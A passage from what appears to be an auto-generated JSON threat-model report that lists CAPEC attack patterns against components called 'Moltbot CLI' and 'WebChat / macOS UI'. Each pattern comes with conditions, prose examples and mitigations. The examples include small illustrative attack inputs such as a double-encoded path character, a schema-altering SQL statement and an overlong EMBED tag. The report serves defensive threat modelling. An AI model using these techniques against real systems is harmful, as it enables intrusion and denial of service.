SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.", "id": "29", "mitigations": "Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.", "references": "https://capec.mitre.org/data/definitions/267.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP35"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False", "cvss": "", "description": "Schema Poisoning", "details": "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.", "example": "In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.", "id": "30", "mitigations": "Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.", "references": "https://capec.mitre.org/data/definitions/271.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "AC15"}, {"assumption": null, "condition": "(target.controls.usesStrongSessionIdentifiers is False or target.controls.encryptsCookies is False) and target.controls.definesConnectionTimeout is False", "cvss": "", "description": "Session Hijacking - ClientSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "31", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "AC18"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Argument Injection", "details": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.", "example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]", "id": "32", "mitigations": "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.", "references": "https://capec.mitre.org/data/definitions/6.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP41"}, {"assumption": null, "condition": "target.controls.definesConnectionTimeout is False and (target.controls.usesMFA is False or target.controls.encryptsSessionData is False)", "cvss": "", "description": "Reusing Session IDs (aka Session Replay) - ClientSide", "details": "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.", "example": "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258", "id": "33", "mitigations": "Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.", "references": "https://capec.mitre.org/data/definitions/60.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "AC20"}, {"assumption": null, "condition": "target.controls.implementsCSRFToken is False or target.controls.verifySessionIdentifiers is False", "cvss": "", "description": "Cross Site Request Forgery", "details": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.", "example": "While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.", "id": "34", "mitigations": "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.", "references": "https://capec.mitre.org/data/definitions/62.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "AC21"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "Overflow Buffers", "details": "Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.", "example": "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.", "id": "35", "mitigations": "Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.", "references": "https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "INP02"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "36", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "AA01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "37", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "38", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.usesSecureFunctions is False", "cvss": "", "description": "Buffer Manipulation", "details": "An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.", "example": "Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.", "id": "39", "mitigations": "To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.", "references": "https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "INP07"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "40", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "41", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "42", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False and target.controls.validatesInput is False", "cvss": "", "description": "Client-side Injection-induced Buffer Overflow", "details": "This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.", "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.", "id": "43", "mitigations": "The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP12"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Delimiters", "details": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.", "example": "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.", "id": "44", "mitigations": "Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.", "references": "https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP13"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "45", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "46", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "47", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.disablesiFrames is False", "cvss": "", "description": "iFrame Overlay", "details": "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.", "example": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.", "id": "48", "mitigations": "Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.", "references": "https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP20"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)", "cvss": "", "description": "File Content Injection", "details": "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.", "example": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]", "id": "49", "mitigations": "Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.", "references": "https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "INP23"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Privilege Escalation", "details": "An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "50", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "AC12"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Hijacking a privileged process", "details": "An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "51", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "AC13"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False and (target.usesEnvironmentVariables is True or target.controls.validatesInput is False)", "cvss": "", "description": 